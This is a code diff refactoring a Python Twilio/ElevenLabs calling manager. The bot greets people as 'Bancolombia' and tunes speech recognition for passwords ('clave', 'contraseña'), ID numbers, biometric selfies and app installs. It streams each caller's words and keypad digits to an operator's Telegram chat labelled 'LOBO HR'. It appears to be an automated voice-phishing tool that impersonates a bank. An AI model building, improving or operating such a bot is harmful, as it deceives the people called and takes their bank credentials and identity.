@@ -1,14 +1,13 @@
 """
-VoIP Manager - Gestión de llamadas con Twilio y ElevenLabs
-Refactorizado: código limpio, sin duplicación, solo ElevenLabs
+Gestor de llamadas VoIP con Twilio y ElevenLabs
+Patrón: State - Gestión de estados de llamada
 """
-
 from twilio.rest import Client
 from twilio.twiml.voice_response import VoiceResponse, Gather
 from loguru import logger
 from config import settings
 from datetime import datetime
-from typing import Dict, List, TYPE_CHECKING
+from typing import Dict, List, TYPE_CHECKING, Optional
 import asyncio
 import time
 import os
@@ -18,47 +17,39 @@ if TYPE_CHECKING:
 
 
 class VoIPManager:
-    """Gestor de llamadas VoIP con Twilio y síntesis de voz ElevenLabs"""
+    """
+    Gestor de llamadas VoIP
+    Patrón: State + Facade
+    """
+    
+    # Constantes
+    MAX_HISTORY = 100
+    ELEVENLABS_RETRIES = 5
+    RETRY_DELAY = 0.5
+    AI_TIMEOUT = 3.0
     
     def __init__(self, caller_bot: 'CallerBot'):
-        """
-        Inicializar VoIP Manager con arquitectura optimizada
-        
-        Args:
-            caller_bot: Instancia del bot principal para acceso a componentes
-        """
         self.caller_bot = caller_bot
-        self.client = None
+        self.client: Optional[Client] = None
         self.active_calls: Dict[str, dict] = {}
         self.call_history: List[dict] = []
         self.no_speech_attempts: Dict[str, int] = {}
-        self.call_lock = asyncio.Lock()  # Lock para operaciones concurrentes seguras
+        self.call_lock = asyncio.Lock()
         
-        logger.info("📞 VoIP Manager creado con soporte multi-llamadas")
+        logger.info("📞 VoIP Manager inicializado")
     
-    async def initialize(self):
-        """Inicializar cliente de Twilio con validación"""
+    
+    async def initialize(self) -> None:
+        """Inicializar cliente Twilio"""
         try:
             self.client = Client(settings.twilio_account_sid, settings.twilio_auth_token)
-            logger.info("✅ Cliente Twilio inicializado correctamente")
+            logger.info("✅ Twilio inicializado")
         except Exception as e:
-            logger.error(f"❌ Error inicializando Twilio: {e}")
+            logger.error(f"❌ Error Twilio: {e}")
             raise
     
     async def make_call(self, to_number: str, telegram_chat_id: int) -> str:
-        """
-        Iniciar llamada telefónica
-        
-        Args:
-            to_number: Número destino en formato E.164 (+34XXXXXXXXX)
-            telegram_chat_id: ID del chat de Telegram para notificaciones
-        
-        Returns:
-            Call SID de Twilio
-        
-        Raises:
-            Exception: Si el cliente no está inicializado o falla la llamada
-        """
+        """Iniciar llamada"""
         if not self.client:
             raise Exception("Cliente Twilio no inicializado")
         
@@ -78,7 +69,7 @@ class VoIPManager:
                 timeout=60
             )
             
-            # Registrar llamada activa
+            # Registrar llamada
             self.active_calls[call.sid] = {
                 'sid': call.sid,
                 'number': to_number,
@@ -88,48 +79,31 @@ class VoIPManager:
                 'transcript': []
             }
             
-            # Inicializar contador
             self.no_speech_attempts[call.sid] = 0
             
-            logger.info(f"📞 Llamada a: {to_number}")
+            logger.info(f"📞 Llamando a {to_number}")
             return call.sid
             
         except Exception as e:
-            logger.error(f"❌ Error al realizar llamada: {e}", exc_info=True)
+            logger.error(f"❌ Error llamada: {e}", exc_info=True)
             raise
     
     async def hangup_call(self, call_sid: str) -> bool:
-        """
-        Finalizar llamada de forma segura y mover al historial
-        
-        Args:
-            call_sid: ID de la llamada a finalizar
-            
-        Returns:
-            True si se finalizó exitosamente, False si hubo error
-        """
+        """Finalizar llamada"""
         async with self.call_lock:
             try:
-                # Intentar finalizar llamada en Twilio
                 self.client.calls(call_sid).update(status='completed')
                 
-                # Mover a historial si existe en activas
-                success = False
                 if call_sid in self.active_calls:
                     call_data = self.active_calls.pop(call_sid)
-                    duration = (datetime.now() - call_data['start_time']).seconds
-                    call_data['duration'] = duration
+                    call_data['duration'] = (datetime.now() - call_data['start_time']).seconds
                     call_data['status'] = 'completed'
                     call_data['end_time'] = datetime.now()
                     
-                    # Agregar al historial (mantener últimas 100)
                     self.call_history.append(call_data)
-                    if len(self.call_history) > 100:
-                        self.call_history = self.call_history[-100:]
-                    
-                    success = True
+                    if len(self.call_history) > self.MAX_HISTORY:
+                        self.call_history = self.call_history[-self.MAX_HISTORY:]
                 
-                # Limpiar datos asociados
                 if call_sid in self.no_speech_attempts:
                     del self.no_speech_attempts[call_sid]
                 
@@ -137,57 +111,38 @@ class VoIPManager:
                 return True
                 
             except Exception as e:
-                logger.error(f"❌ Error al colgar llamada {call_sid[:8]}: {e}")
+                logger.error(f"❌ Error colgar {call_sid[:8]}: {e}")
                 return False
     
     async def hangup_all_calls(self) -> dict:
-        """
-        Finalizar todas las llamadas activas
-        
-        Returns:
-            Diccionario con estadísticas: {'success': int, 'failed': int, 'total': int}
-        """
+        """Finalizar todas las llamadas"""
         active_call_ids = list(self.active_calls.keys())
         total = len(active_call_ids)
         
         if total == 0:
             return {'success': 0, 'failed': 0, 'total': 0}
         
-        logger.info(f"🔴 Finalizando {total} llamadas activas...")
+        logger.info(f"🔴 Finalizando {total} llamadas...")
         
-        success = 0
-        failed = 0
-        
-        # Finalizar todas las llamadas en paralelo
         tasks = [self.hangup_call(call_sid) for call_sid in active_call_ids]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         
-        for result in results:
-            if result is True:
-                success += 1
-            else:
-                failed += 1
+        success = sum(1 for r in results if r is True)
+        failed = total - success
         
-        logger.info(f"✅ Finalizadas: {success}/{total} exitosas")
+        logger.info(f"✅ Finalizadas: {success}/{total}")
         
         return {'success': success, 'failed': failed, 'total': total}
     
+    
     async def handle_incoming_call(self, call_sid: str) -> str:
-        """
-        Manejar llamada entrante con ElevenLabs - OPTIMIZADO Y ROBUSTO
-        
-        Args:
-            call_sid: ID de la llamada
-        
-        Returns:
-            TwiML XML con audio de ElevenLabs
-        """
+        """Manejar llamada entrante"""
         try:
-            logger.info(f"📞 PROCESANDO LLAMADA ENTRANTE: {call_sid}")
+            logger.info(f"📞 PROCESANDO: {call_sid}")
             
-            # Registrar llamada si no existe
+            # Auto-registrar si no existe
             if call_sid not in self.active_calls:
-                logger.warning(f"⚠️ Llamada {call_sid[:8]} no registrada previamente, auto-registrando...")
+                logger.warning(f"⚠️ Auto-registrando {call_sid[:8]}")
                 self.active_calls[call_sid] = {
                     'sid': call_sid,
                     'number': 'Desconocido',
@@ -202,28 +157,20 @@ class VoIPManager:
                 telegram_chat_id = self.active_calls[call_sid].get('telegram_chat_id')
                 phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
                 
-                # Notificaciones en background
                 if telegram_chat_id:
                     asyncio.create_task(self._notify_call_answered(telegram_chat_id, phone_number, call_sid))
             
-            # VALIDAR que AI esté disponible
+            # Generar saludo inicial
             if not self.caller_bot or not hasattr(self.caller_bot, 'ai_conversation'):
-                logger.error("🚨 AI no disponible - usando mensaje predefinido")
                 initial_message = "Hola buenos días, te hablo de Bancolombia. ¿Me escuchas bien?"
             else:
-                # Generar saludo inicial con timeout
-                logger.info("🤖 Generando saludo inicial con AI...")
                 try:
                     initial_message = await asyncio.wait_for(
                         self.caller_bot.ai_conversation.get_initial_greeting(),
-                        timeout=3.0
+                        timeout=self.AI_TIMEOUT
                     )
-                    logger.info(f"💬 Saludo AI generado: '{initial_message[:60]}...'")
-                except asyncio.TimeoutError:
-                    logger.warning("⏱️ Timeout generando saludo AI - usando fallback")
-                    initial_message = "Hola buenos días, te hablo de Bancolombia. ¿Me escuchas bien?"
-                except Exception as ai_error:
-                    logger.error(f"❌ Error AI: {ai_error} - usando fallback")
+                except (asyncio.TimeoutError, Exception) as e:
+                    logger.warning(f"⏱️ Timeout/Error AI: {e} - fallback")
                     initial_message = "Hola buenos días, te hablo de Bancolombia. ¿Me escuchas bien?"
             
             # Registrar en transcript
@@ -235,98 +182,72 @@ class VoIPManager:
                 })
             
             # Generar audio con ElevenLabs
-            logger.info(f"🎵 Sintetizando audio con ElevenLabs para: '{initial_message[:50]}...'")
+            logger.info(f"🎵 Sintetizando: '{initial_message[:50]}'...")
             twiml = await self.generate_elevenlabs_twiml(initial_message, call_sid)
-            logger.info(f"✅ TwiML generado exitosamente ({len(twiml)} chars)")
+            logger.info(f"✅ TwiML generado")
             return twiml
             
         except Exception as e:
-            logger.error(f"🚨 ERROR CRÍTICO en handle_incoming_call: {e}", exc_info=True)
-            # Fallback usando TAMBIÉN ElevenLabs con mensaje simple
-            logger.warning("🔄 Usando fallback con ElevenLabs")
+            logger.error(f"🚨 ERROR handle_incoming_call: {e}", exc_info=True)
             try:
                 return await self.generate_elevenlabs_twiml("Hola buenas. ¿Me escuchas bien?", call_sid)
             except:
-                # Si incluso ElevenLabs falla, usar Say
                 return self._generate_say_twiml("Hola buenas. ¿Me escuchas bien?")
     
     async def generate_elevenlabs_twiml(self, text: str, call_sid: str) -> str:
-        """
-        Generar TwiML con ElevenLabs - SIEMPRE
-        
-        Args:
-            text: Texto a sintetizar
-            call_sid: ID de la llamada
-        
-        Returns:
-            TwiML con audio de ElevenLabs
-        """
-        # Intentar 5 veces con ElevenLabs - SOLO ElevenLabs, NADA DE POLLY
-        for attempt in range(5):
+        """Generar TwiML con ElevenLabs"""
+        for attempt in range(self.ELEVENLABS_RETRIES):
             try:
-                # Crear respuesta TwiML PRIMERO
                 response = VoiceResponse()
-                
-                # Nombre único
                 audio_filename = f"call_{call_sid}_{int(datetime.now().timestamp() * 1000)}.mp3"
                 
-                # Sintetizar con ElevenLabs PURO
-                logger.info(f"🎙️ ElevenLabs intento {attempt + 1}/5 - Texto: '{text[:50]}'...")
+                logger.info(f"🎙️ ElevenLabs {attempt + 1}/5: '{text[:50]}'...")
                 audio_bytes = await self.caller_bot.voice_synthesizer.text_to_speech(
                     text,
                     filename=audio_filename
                 )
                 
                 if not audio_bytes or len(audio_bytes) < 1000:
-                    raise Exception("Audio muy pequeño o vacío")
+                    raise Exception("Audio muy pequeño")
                 
-                logger.info(f"✅ Audio generado: {len(audio_bytes)} bytes")
-                
-                # Guardar y obtener URL inmediatamente (sin esperar)
                 audio_url = f"{settings.webhook_url}/audio/{audio_filename}"
-                logger.info(f"📡 URL lista: {audio_url}")
                 
-                # Gather: VOZ + DTMF - OPTIMIZADO PARA ESCUCHA PERFECTA
+                # Gather optimizado
                 gather = Gather(
-                    input='speech dtmf',  # VOZ + TECLADO simultáneo
-                    language=settings.language,  # es-CO (Español Colombia)
-                    timeout=settings.gather_timeout,  # 5 segundos - tiempo para empezar
-                    speech_timeout=settings.speech_timeout,  # 1 segundo - silencio indica fin
+                    input='speech dtmf',
+                    language=settings.language,
+                    timeout=settings.gather_timeout,
+                    speech_timeout=settings.speech_timeout,
                     speechTimeout=settings.speech_timeout,
-                    maxSpeechTime=settings.max_speech_time,  # 60 segundos
+                    maxSpeechTime=settings.max_speech_time,
                     action='/voice/process_speech',
                     method='POST',
-                    profanityFilter=False,  # Sin filtro
-                    enhanced=True,  # Reconocimiento mejorado
-                    speech_model='phone_call',  # Optimizado para llamadas
-                    numDigits=20,  # 20 dígitos máximo
-                    # HINTS EXTENDIDOS - Palabras y frases colombianas completas
+                    profanityFilter=False,
+                    enhanced=True,
+                    speech_model='phone_call',
+                    numDigits=20,
                     hints='sí claro, no gracias, hola buenas, aló buenas, cómo estás, bien gracias, perfecto listo, entiendo, si señora, si señor, correcto, exacto, aja, pues sí, obvio, dale, listo entonces, bueno entonces, ok perfecto, de una, parcero, hermano, compa, dígame, cuéntame, mire, vea, espere un momento, un segundo, ya ya, ahora sí, banco, Bancolombia, Davivienda, cédula, documento, identidad, nombre completo, apellidos, teléfono, celular, correo electrónico, clave, contraseña, usuario, app, aplicación, descargar, instalar, activar, verificar, confirmar, biometría, rostro, selfie, foto, cámara, SOY YO, números: cero, uno, dos, tres, cuatro, cinco, seis, siete, ocho, nueve, diez, once, doce, trece, catorce, quince'
                 )
                 
-                # Play ElevenLabs dentro de Gather
                 gather.play(audio_url)
                 response.append(gather)
                 response.redirect('/voice/process_speech')
                 
-                logger.info(f"✅ ElevenLabs OK ({len(audio_bytes)} bytes) - Reconocimiento optimizado")
+                logger.info(f"✅ ElevenLabs OK ({len(audio_bytes)} bytes)")
                 return str(response)
                 
             except Exception as e:
-                logger.error(f"❌ ElevenLabs intento {attempt + 1}/5: {e}")
-                if attempt < 4:
-                    await asyncio.sleep(0.5)  # Esperar 0.5s entre reintentos
-                    continue
+                logger.error(f"❌ Intento {attempt + 1}/5: {e}")
+                if attempt < self.ELEVENLABS_RETRIES - 1:
+                    await asyncio.sleep(self.RETRY_DELAY)
                 else:
-                    # Después de 5 intentos, COLGAR (NO usar Polly)
-                    logger.error("🚨 ElevenLabs falló - COLGANDO llamada (NO POLLY)")
+                    logger.error("🚨 ElevenLabs falló - COLGANDO")
                     return self._generate_error_twiml()
     
-    async def _notify_call_answered(self, telegram_chat_id: int, phone_number: str, call_sid: str):
-        """Notificar en background sin bloquear con formato mejorado"""
+    async def _notify_call_answered(self, telegram_chat_id: int, phone_number: str, call_sid: str) -> None:
+        """Notificar llamada contestada"""
         try:
             timestamp = datetime.now().strftime("%H:%M:%S")
-            
             message = f"""━━━━━━━━━━━━━━━━━━━━━━━
 ✅ **LLAMADA ACTIVA**
 ━━━━━━━━━━━━━━━━━━━━━━━
@@ -335,59 +256,38 @@ class VoIPManager:
 ⏰ **Inicio:** {timestamp}
 🆔 **ID:** `{call_sid[:12]}`
 
-🎧 *Cliente en línea, escuchando...*
+🎧 *Cliente en línea*
 """
-            await self.caller_bot.telegram_bot.send_message(
-                telegram_chat_id,
-                message
-            )
+            await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
         except:
             pass
     
-    async def _send_ai_response_to_telegram(self, telegram_chat_id: int, text: str, phone_number: str = None):
-        """Enviar respuesta IA a Telegram con formato mejorado"""
+    async def _send_ai_response_to_telegram(self, telegram_chat_id: int, text: str, phone_number: str = None) -> None:
+        """Enviar respuesta IA a Telegram"""
         try:
             timestamp = datetime.now().strftime("%H:%M:%S")
             call_id = phone_number if phone_number and phone_number != 'Desconocido' else "N/A"
-            
-            message = f"""🤖 **LLAMADOR EL LOBO HR** • `{call_id}`
-⏰ {timestamp}
-
-💬 {text}
-━━━━━━━━━━━━━━━━━"""
-            await self.caller_bot.telegram_bot.send_message(
-                telegram_chat_id,
-                message
-            )
-        except Exception as e:
-            logger.warning(f"Error enviando respuesta IA: {e}")
+            message = f"🤖 **LOBO HR** • `{call_id}`\n⏰ {timestamp}\n\n💬 {text}\n━━━━━━━━━━━━━━━━━"
+            await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
+        except:
+            pass
     
     async def handle_speech_input(self, call_sid: str, speech_text: str, input_type: str = "VOZ") -> str:
-        """
-        Procesar entrada del usuario (VOZ o DTMF) y generar respuesta INMEDIATA
-        
-        Args:
-            call_sid: ID de la llamada
-            speech_text: Texto transcrito (voz o dígitos del teclado)
-            input_type: "VOZ" o "DTMF"
-        
-        Returns:
-            TwiML XML con respuesta de audio
-        """
+        """Procesar entrada del usuario (voz o DTMF)"""
         try:
             if call_sid not in self.active_calls:
                 logger.warning(f"⚠️ Llamada no encontrada: {call_sid}")
                 return self._generate_error_twiml()
             
-            # Si no hay entrada, preguntar de nuevo
             if not speech_text or speech_text.strip() == "":
-                logger.info(f"🔇 Sin respuesta del usuario en {call_sid}")
+                logger.info(f"🔇 Sin respuesta: {call_sid}")
                 return await self.generate_followup_question(call_sid)
             
-            # Resetear contador (usuario respondió)
+            # Reset contador
             self.no_speech_attempts[call_sid] = 0
             
             telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
+            phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
             
             # Registrar entrada
             self.active_calls[call_sid]['transcript'].append({
@@ -397,90 +297,55 @@ class VoIPManager:
                 'timestamp': datetime.now()
             })
             
-            # Notificar a Telegram con formato mejorado
+            # Notificar a Telegram
             emoji = "🎤" if input_type == "VOZ" else "⌨️"
             timestamp = datetime.now().strftime("%H:%M:%S")
-            phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
             
             try:
-                message = f"""{emoji} **CLIENTE** • `{phone_number}`
-⏰ {timestamp} • _{input_type}_
-
-💭 \"{speech_text}\"
-━━━━━━━━━━━━━━━━━"""
-                await self.caller_bot.telegram_bot.send_message(
-                    telegram_chat_id,
-                    message
-                )
-            except Exception as e:
-                logger.warning(f"Error enviando a Telegram: {e}")
+                message = f"{emoji} **CLIENTE** • `{phone_number}`\n⏰ {timestamp} • _{input_type}_\n\n💭 \"{speech_text}\"\n━━━━━━━━━━━━━━━━━"
+                await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
+            except:
+                pass
             
-            # Obtener respuesta IA INMEDIATA (2.0s timeout)
-            ai_response = await self.caller_bot.ai_conversation.get_response(
-                call_sid,
-                speech_text
-            )
+            # Obtener respuesta IA
+            ai_response = await self.caller_bot.ai_conversation.get_response(call_sid, speech_text)
             
-            # Registrar respuesta IA
+            # Registrar respuesta
             self.active_calls[call_sid]['transcript'].append({
                 'speaker': 'ai',
                 'text': ai_response,
                 'timestamp': datetime.now()
             })
             
-            # Notificar en background (sin bloquear)
-            phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
+            # Notificar en background
             asyncio.create_task(
                 self._send_ai_response_to_telegram(telegram_chat_id, ai_response, phone_number)
             )
             
-            # Generar audio ElevenLabs y responder INMEDIATAMENTE
+            # Generar audio y responder
             return await self.generate_elevenlabs_twiml(ai_response, call_sid)
             
         except Exception as e:
-            logger.error(f"❌ Error procesando voz en {call_sid}: {e}", exc_info=True)
+            logger.error(f"❌ Error procesando voz: {e}", exc_info=True)
             return self._generate_error_twiml()
     
     async def generate_twiml_response(self, text: str, call_sid: str) -> str:
-        """
-        Generar TwiML con audio de ElevenLabs PURO (NO Polly)
-        
-        Args:
-            text: Texto a sintetizar
-            call_sid: ID de la llamada
-        
-        Returns:
-            TwiML string con ElevenLabs PURO
-        """
-        # Usar el método principal que tiene 5 reintentos y NO usa Polly
+        """Generar TwiML con ElevenLabs"""
         return await self.generate_elevenlabs_twiml(text, call_sid)
     
     async def generate_followup_question(self, call_sid: str) -> str:
-        """
-        Generar pregunta de seguimiento cuando no hay respuesta del usuario
-        
-        Args:
-            call_sid: ID de la llamada
-        
-        Returns:
-            TwiML con pregunta de seguimiento o comando de colgar
-        """
-        # Incrementar contador
+        """Generar pregunta de seguimiento sin respuesta"""
         self.no_speech_attempts[call_sid] = self.no_speech_attempts.get(call_sid, 0) + 1
         
         current_attempts = self.no_speech_attempts[call_sid]
         max_attempts = settings.no_speech_attempts
         
-        logger.warning(
-            f"⚠️ Sin respuesta en {call_sid} - "
-            f"Intento {current_attempts}/{max_attempts}"
-        )
+        logger.warning(f"⚠️ Sin respuesta {call_sid} - {current_attempts}/{max_attempts}")
         
-        # Si se alcanzó el máximo de intentos (2), despedirse y colgar
+        # Máximo alcanzado: despedirse
         if current_attempts >= max_attempts:
-            logger.warning(f"🔴 Finalizando llamada {call_sid} - sin respuesta después de {max_attempts} intentos")
+            logger.warning(f"🔴 Finalizando {call_sid} - sin respuesta")
             
-            # Notificar a Telegram con formato mejorado
             if call_sid in self.active_calls:
                 telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
                 phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
@@ -492,30 +357,24 @@ class VoIPManager:
 
 📞 **Número:** `{phone_number}`
 ⏰ **Fin:** {timestamp}
-❌ **Motivo:** Cliente no responde
+❌ **Motivo:** Sin respuesta
 
-🔴 *Llamada terminada*
+🔴 *Terminada*
 """
-                await self.caller_bot.telegram_bot.send_message(
-                    telegram_chat_id,
-                    message
-                )
+                await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
             
-            # Despedida breve y colgar
+            # Despedida y colgar
             response = VoiceResponse()
-            # Intentar usar ElevenLabs incluso para despedida
             try:
-                import base64
                 audio_bytes = await self.caller_bot.voice_synthesizer.text_to_speech("Gracias, hasta luego.")
                 audio_url = f"{settings.webhook_url}/audio/goodbye_{call_sid[:8]}.mp3"
                 response.play(audio_url)
             except:
-                # Si falla, usar Say
                 response.say("Gracias, hasta luego.", language='es-CO', voice='Polly.Mia')
             response.hangup()
             return str(response)
         
-        # Pregunta de seguimiento basada en el intento
+        # Pregunta de seguimiento
         followup_questions = [
             "¿Aló? ¿Me escuchas?",
             "¿Estás ahí?",
@@ -525,32 +384,19 @@ class VoIPManager:
         ]
         question = followup_questions[min(current_attempts - 1, len(followup_questions) - 1)]
         
-        # Notificar a Telegram con formato mejorado
+        # Notificar
         if call_sid in self.active_calls:
             telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
             phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
             
-            message = f"""🔇 **SIN RESPUESTA** • `{phone_number}`
-
-⚠️ Intento {current_attempts}/{max_attempts}
-🔄 Repreguntando: *\"{question}\"*
-"""
-            await self.caller_bot.telegram_bot.send_message(
-                telegram_chat_id,
-                message
-            )
+            message = f"🔇 **SIN RESPUESTA** • `{phone_number}`\n\n⚠️ Intento {current_attempts}/{max_attempts}\n🔄 *\"{question}\"*"
+            await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
         
         return await self.generate_twiml_response(question, call_sid)
     
-    async def handle_call_status(self, call_sid: str, call_status: str):
-        """
-        Manejar actualizaciones de estado de llamada desde Twilio
-        
-        Args:
-            call_sid: ID de la llamada
-            call_status: Estado actual (initiated, ringing, in-progress, completed, etc.)
-        """
-        logger.info(f"📊 Estado de llamada {call_sid[:8]}: {call_status}")
+    async def handle_call_status(self, call_sid: str, call_status: str) -> None:
+        """Manejar actualizaciones de estado"""
+        logger.info(f"📊 Estado {call_sid[:8]}: {call_status}")
         
         if call_sid in self.active_calls:
             self.active_calls[call_sid]['status'] = call_status
@@ -558,10 +404,9 @@ class VoIPManager:
             telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
             phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
             
-            # Mapeo de estados a mensajes con emojis
             status_messages = {
                 'initiated': f'📞 **Iniciando** • `{phone_number}`',
-                'ringing': f'📱 **Timbrando...** • `{phone_number}`',
+                'ringing': f'📱 **Timbrando** • `{phone_number}`',
                 'in-progress': f'✅ **En curso** • `{phone_number}`',
                 'completed': f'🔴 **Finalizada** • `{phone_number}`',
                 'failed': f'❌ **Fallida** • `{phone_number}`',
@@ -570,25 +415,14 @@ class VoIPManager:
                 'canceled': f'🚫 **Cancelada** • `{phone_number}`'
             }
             
-            message = status_messages.get(call_status, f"📊 **Estado:** `{call_status}` • `{phone_number}`")
+            message = status_messages.get(call_status, f"📊 `{call_status}` • `{phone_number}`")
+            await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
             
-            # Notificar a Telegram
-            await self.caller_bot.telegram_bot.send_message(
-                telegram_chat_id,
-                message
-            )
-            
-            # Si la llamada terminó, mover al historial
             if call_status in ['completed', 'failed', 'busy', 'no-answer', 'canceled']:
                 await self.hangup_call(call_sid)
     
     async def get_active_calls(self) -> List[dict]:
-        """
-        Obtener lista de llamadas activas con duración
-        
-        Returns:
-            Lista de diccionarios con información de llamadas activas
-        """
+        """Obtener llamadas activas con duración"""
         calls = []
         for call_sid, call_data in self.active_calls.items():
             duration = (datetime.now() - call_data['start_time']).seconds
@@ -602,58 +436,35 @@ class VoIPManager:
         return calls
     
     async def get_call_history(self, limit: int = 10) -> List[dict]:
-        """
-        Obtener historial de llamadas recientes
-        
-        Args:
-            limit: Número máximo de llamadas a retornar
-        
-        Returns:
-            Lista de llamadas históricas (más recientes primero)
-        """
+        """Obtener historial reciente"""
         return self.call_history[-limit:][::-1]
     
-    async def cleanup(self):
-        """Limpiar recursos y finalizar llamadas activas"""
+    async def cleanup(self) -> None:
+        """Limpiar recursos"""
         logger.info("🧹 Limpiando VoIP Manager...")
         
-        # Finalizar todas las llamadas activas
         for call_sid in list(self.active_calls.keys()):
             try:
                 await self.hangup_call(call_sid)
             except Exception as e:
-                logger.error(f"Error finalizando llamada {call_sid}: {e}")
+                logger.error(f"Error finalizando {call_sid}: {e}")
         
-        # Limpiar contadores
         self.no_speech_attempts.clear()
-        
-        logger.info("✅ VoIP Manager limpiado")
-    
-    # POLLY ELIMINADO COMPLETAMENTE - SOLO ELEVENLABS PURO
+        logger.info("✅ Limpieza completa")
     
     def _generate_error_twiml(self) -> str:
-        """
-        Error crítico - Intentar usar ElevenLabs primero, luego Say en español
-        
-        Returns:
-            TwiML de error en español usando ElevenLabs si es posible
-        """
-        logger.error("🚨 ERROR CRÍTICO - Intentando mensaje con ElevenLabs")
+        """Error crítico - intentar ElevenLabs, luego Say"""
+        logger.error("🚨 ERROR CRÍTICO")
         response = VoiceResponse()
         
-        # Intentar generar audio con ElevenLabs para mensaje de error
         try:
-            import asyncio
             loop = asyncio.get_event_loop()
-            error_msg = "Disculpa, estamos presentando inconvenientes técnicos. Por favor intenta más tarde. Hasta luego."
+            error_msg = "Disculpa, inconvenientes técnicos. Intenta más tarde. Hasta luego."
             
-            # Ejecutar síntesis de forma síncrona
             audio_bytes = loop.run_until_complete(
                 self.caller_bot.voice_synthesizer.text_to_speech(error_msg)
             )
             
-            # Guardar y reproducir
-            import time
             audio_filename = f"error_{int(time.time())}.mp3"
             audio_path = os.path.join("audio_cache", audio_filename)
             with open(audio_path, 'wb') as f:
@@ -661,11 +472,11 @@ class VoIPManager:
             
             audio_url = f"{settings.webhook_url}/audio/{audio_filename}"
             response.play(audio_url)
-            logger.info("✅ Mensaje de error generado con ElevenLabs")
+            logger.info("✅ Error con ElevenLabs")
         except Exception as e:
-            logger.error(f"❌ No se pudo usar ElevenLabs para error: {e}, usando Say")
+            logger.error(f"❌ Fallback a Say: {e}")
             response.say(
-                "Disculpa, estamos presentando inconvenientes técnicos. Por favor intenta más tarde. Hasta luego.",
+                "Disculpa, inconvenientes técnicos. Intenta más tarde. Hasta luego.",
                 language='es-CO',
                 voice='Polly.Mia'
             )
@@ -674,16 +485,8 @@ class VoIPManager:
         return str(response)
     
     def _generate_say_twiml(self, message: str) -> str:
-        """
-        Generar TwiML con Say como fallback de emergencia - SIEMPRE EN ESPAÑOL
-        
-        Args:
-            message: Mensaje a decir
-        
-        Returns:
-            TwiML XML con Say en español colombiano
-        """
-        logger.warning(f"⚠️ Usando Say fallback en español: {message}")
+        """Fallback con Say en español"""
+        logger.warning(f"⚠️ Say fallback: {message}")
         response = VoiceResponse()
         gather = Gather(
             input='speech dtmf',
